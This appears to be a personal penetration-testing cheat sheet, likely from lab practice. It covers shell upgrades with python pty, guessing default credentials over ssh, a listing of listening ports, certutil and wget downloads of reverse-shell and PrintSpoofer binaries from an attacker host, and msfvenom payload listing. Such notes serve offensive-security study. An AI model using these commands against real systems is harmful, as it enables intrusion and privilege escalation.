###### Shell Upgrades
#shell #upgrades
```bash
# once on the box, try to upgrade into better shell for increased functionality such as history and up arrow commands
python -c 'import pty; pty.spawn("/bin/bash")'
```
###### Credentials
#credentials
```shell
#once on box, look for any usernames and if any are open ensure to utilize them or atleast attempt to ssh/rdp/vnc into with goat/goat or oracle/oracle
$ pwd
/home
$ ls
goat
harry
karla
oracle
sally
$ 

# successfully ssh'd in as goat
┌──(root㉿kali)-[/home/kali]
└─# ssh goat@192.168.80.132   
```
###### Checking Running Connections
#running #connections
```shell
# cheap netstat
$ ss -ant
State Recv-Q Send-Q            Local Address:Port            Peer Address:Port  
LISTEN0      80                    127.0.0.1:3306                 0.0.0.0:*     
```
###### Windows File Transfers
#filetransfers
#wget
```bash
wget http://192.168.45.208/rev2.exe
```
#certutil
```shell
#generic certutil
certutil -urlcache -f http://192.168.45.208/rev2.exe

# split tag, works everytime.
certutil.exe -urlcache -split -f "http://192.168.45.233/PrintSpoofer.exe"
certutil.exe -urlcache -split -f "http://192.168.45.233/PrintSpoofer.exe"
```
###### MSFvenom
#msfvenom 
- lists available payloads
```bash
msfvenom --list payloads | grep windows/x64/
```